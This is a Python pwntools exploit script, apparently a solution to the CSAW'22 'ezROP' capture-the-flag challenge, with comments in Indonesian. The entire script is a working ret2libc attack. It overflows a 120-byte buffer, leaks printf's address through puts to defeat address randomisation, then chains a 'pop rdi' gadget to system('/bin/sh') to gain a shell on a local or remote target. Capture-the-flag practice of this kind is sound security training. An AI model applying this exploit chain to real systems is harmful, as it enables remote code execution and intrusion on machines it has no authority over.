from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

# patch with: pwninit
BINARY = "ezROP_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

# copy libc.so.6 from docker container
# docker cp --follow-link ezrop:/home/ctf/lib/x86_64-linux-gnu/libc.so.6 ./
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.31.so', checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"My friend, what's your name?", content)

    def leak(self, address):
        '''
        leak address menggunakan plt.puts
        '''
        p = self.p
        pay = b''
        pay += b'\x00'
        pay += cyclic(120-len(pay))
        pay += pack("<Q", ROP(exe).find_gadget(['pop rdi', 'ret'])[0])
        pay += pack("<Q", address)
        pay += pack("<Q", exe.plt['puts'])
        pay += pack("<Q", exe.sym['main'])
        self.send(pay)
        p.recvuntil("CSAW'22!\n")
        return p.recvline().strip()


def rp(x): return ROP(libc).find_gadget(x)[0]
def pck(x): return pack("<Q", x)


x, p = init()

x.debug("b *main+40\nc")

# me-leak address dari libc menggunakan plt.puts
libc.address = btl(x.leak(exe.got['printf'])[::-1]) - libc.sym['printf']
log.success("libc.address @ {}".format(hex(libc.address)))


# membuat shell menggunakan system function di libc
pay = b''
pay += b'\x00'
pay += cyclic(120-len(pay))
pay += pck(rp(['pop rdi', 'ret']))
pay += pck(next(libc.search(b'/bin/sh')))
pay += pck(rp(['ret']))
pay += pck(libc.sym['system'])

x.send(pay)

p.interactive()
